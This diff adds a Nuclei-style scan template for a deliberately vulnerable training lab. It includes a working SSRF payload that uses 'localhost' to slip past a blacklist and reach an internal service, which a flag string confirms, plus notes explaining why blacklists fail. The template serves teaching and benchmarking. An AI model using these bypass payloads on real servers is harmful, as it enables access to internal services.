@@ -1,0 +1,63 @@
+id: vulnlab-ssrf-localhost-bypass
+
+info:
+  name: VulnLab SSRF（medium 档 · localhost 等价写法绕过黑名单）
+  severity: high
+  author: hediwen
+  tags: [ssrf, vulnlab, benchmark, blacklist-bypass]
+  description: |
+    medium 档用黑名单拦内网地址，但只认得几个字面量（`127.0.0.1`、`192.168.`、`10.` …），
+    漏了 `localhost`。
+
+    这不是实现者的疏忽，而是黑名单的结构性缺陷：同一个主机有无数种等价写法
+    （`localhost` / `127.1` / `[::1]` / 解析到内网的域名），
+    枚举永远追不上。high 档改成「先解析、再校验 IP 归属」才根治。
+
+    本 PoC 请求内网服务（127.0.0.1:8090），判据是内网页面里的专属标记 ——
+    只有真的打进去了才会出现。
+
+  reference:
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+
+requests:
+  # ── ① 对照组：字面量写法应当被拦（不计入命中）──────────────────
+  - method: GET
+    path:
+      - "{{BaseURL}}/ssrf/medium.php?url=http%3A%2F%2F127.0.0.1%3A8090%2Finternal%2Finner-service.php"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words: ["VULNLAB{ssrf_reached_internal_service}"]
+
+  # ── ② 绕过：localhost 等价写法 ─────────────────────────────────
+  - method: GET
+    path:
+      - "{{BaseURL}}/ssrf/medium.php?url=http%3A%2F%2Flocalhost%3A8090%2Finternal%2Finner-service.php"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words: ["VULNLAB{ssrf_reached_internal_service}"]
+
+      # 反向保险：只认「过滤器命中」这个结论句。
+      #
+      # 不要把「黑名单」这类词汇写成负向判据 —— 该档的教学文案里出现了 5 次
+      # 「黑名单」，用词汇做负向匹配会把**真实命中**否掉。
+      # 这是靶场开发记过两次的教训：负向判据只认结论句，不认词汇。
+      - type: word
+        part: body
+        words: ["过滤器命中"]
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        name: internal_marker
+        regex:
+          - "VULNLAB\\{ssrf_reached_internal_service\\}"
